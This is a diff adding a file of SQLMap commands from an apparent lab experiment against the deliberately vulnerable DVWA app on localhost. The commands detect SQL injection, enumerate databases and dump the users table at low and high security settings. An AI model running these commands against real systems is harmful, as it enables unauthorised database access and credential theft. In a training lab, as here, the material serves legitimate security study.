@@ -1,0 +1,21 @@
+# SQLMap commands used in the experiment
+
+# Low security configuration (authenticated session)
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" ^
+--cookie="security=low; PHPSESSID=YOUR_SESSION_ID"
+
+# Detect injectable parameters
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" ^
+--cookie="security=low; PHPSESSID=YOUR_SESSION_ID" --batch
+
+# Enumerate databases
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" ^
+--cookie="security=low; PHPSESSID=YOUR_SESSION_ID" --dbs
+
+# Dump DVWA users table
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" ^
+--cookie="security=low; PHPSESSID=YOUR_SESSION_ID" -D dvwa -T users --dump
+
+# High security configuration test (flush previous session)
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" ^
+--cookie="security=high; PHPSESSID=YOUR_SESSION_ID" --flush-session
